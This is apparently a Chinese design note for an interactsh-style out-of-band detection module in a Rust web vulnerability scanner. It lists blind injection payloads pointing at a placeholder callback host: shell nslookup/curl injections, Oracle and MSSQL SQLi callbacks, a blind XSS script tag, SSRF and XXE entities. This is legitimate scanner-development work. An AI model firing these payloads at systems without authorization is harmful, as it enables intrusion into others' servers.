# 设计 · OOB 带外检测(interactsh client)

> 第一档 ROI #1。解锁所有「盲」漏洞:盲 SSRF / 盲 RCE / 盲 SQLi / 盲 XXE / 盲打 XSS。
> 这些漏洞响应里**零回显**,唯一可靠确认 = 让目标服务器主动回连一个我们控制的带外域名。

## 为什么需要
现有 `scry_scan::active` 全是「基于响应」的检测(SSTI 看乘积、命令注入看 `uid=`…)。但大量真实漏洞是**盲**的:
注入成功了但页面看不出任何变化。Burp Collaborator / interactsh 的做法是:在 payload 里塞一个唯一带外域名,
若目标真的发生注入并对该域名发起 DNS/HTTP 回连,带外服务器记录这次交互 → 我们轮询拿到 → **确认 + 关联**到探测点。

## 架构(三层,沿用项目「纯函数内核 + UI runner」范式)
1. **`scry_oob`(协议内核,纯 CPU 可单测)** —— interactsh client 线缆兼容:
   - `OobSession::generate(server)`:RSA-2048 密钥对 + 20 字符关联 id + secret。
   - `register_body()` / `register_url()`:注册请求(`public-key` = base64(PKIX PEM)、`secret-key`、`correlation-id`)。
   - `new_payload()`:派生一次性带外域名 `<id33>.<server>`(前 20 = 关联 id,后 13 随机)。
   - `poll_url()` / `parse_poll(json)`:轮询 + **解密**——`aes_key` 走 RSA-OAEP(SHA-256)解出 AES-256 密钥;
     每条 `data[i]` = base64(IV(16) ‖ AES-256-CFB 密文) → 解出交互 JSON(protocol / unique-id / remote-address…)。
   - `correlate(interactions, map)`:按 `unique_id` 把回连关联回探测点表。
   - 依赖:`rsa` + `aes` + `cfb-mode` + `sha2` + `rand`(纯 Rust,免 cmake)。**6 单测**(含 RSA-OAEP+AES-CFB 端到端解密)。
2. **`scry_scan::oob`(盲注探测生成,纯函数)** —— 把一个带外域名塞进各类盲漏洞 payload:
   - 盲 RCE:`;nslookup <oob>;` / `|nslookup <oob>` / `$(curl http://<oob>/)`(DNS 优先,只需 DNS 出口最可靠)。
   - 盲 SQLi:Oracle `UTL_INADDR.GET_HOST_ADDRESS`、MSSQL `xp_dirtree \\<oob>\x`。
   - 盲打 XSS:`"><script src=//<oob>></script>`(存储后他人/管理员浏览即回连)。
   - 盲 SSRF:仅疑似 URL 参数,整值换 `http://<oob>/`。
   - 盲 XXE:XML 体换外部实体 `SYSTEM "http://<oob>/x"`。
   - 每条 payload 分配**独立**带外域名 → 回连时能精确关联「哪个参数 / 哪种漏洞 / 哪条 payload」。**5 单测**。
3. **`scry_app::oob`(runner + UI)**:
   - `run_oob_scan`:后台 current-thread runtime →① 生成会话 → ② `replay::send` 注册 → ③ 对当前 Scanner 目标的流
     `generate_oob_probes` 注入(每条独立带外域名,记 `id→(kind,url,param)` 关联表,封顶 240)→ ④ 逐条发探测(忽略响应)
     → ⑤ 轮询带外服务器 12×5s,`parse_poll` 解密 + `correlate` 命中 → Finding 流式回传 → ⑥ 注销收尾。
   - 经 `mpsc<OobMsg{status,finding,done}>` 流式回传,前台 200ms 轮询并入 `scan_findings`(复用 Scanner 的发现列表 + `merge_sort_findings`)。
   - Scanner 工具条:**带外盲扫** 按钮 + 服务器下拉(`oast.fun` 等公共服务器)+ 实时状态(会话域名 / 发送进度 / 轮询命中)。

## 关键约束
- **墙内**:带外服务器(`oast.*`)在境外,注册/轮询/探测都经设置页的**上游代理**(sing-box / QX)出网;不配上游会在注册阶段报「带外服务器连不上」。
- **零侵入引擎**:不改 `scry_proxy` MITM 内核;全部复用 `replay::send`。
- **关联唯一性**:每条 payload 独立带外域名,回连去重按 `unique_id|protocol|remote_address`。
- **严重度**:带外回连 = 真实触发,盲 RCE/SQLi 判 Critical,盲 SSRF/XXE/XSS 判 High。

## 验证
- `scry_oob` 6 测 + `scry_scan` 42 测(+5 oob)+ `scry_app` 77 测全过;全 workspace `clippy` 0 警告(仅上游 `block`)、`build` 通过。
- **待真机**:配好上游后对一个可注入靶站跑「带外盲扫」,看 `oast.fun` 回连 → 命中卡片(需要外网可达带外服务器)。
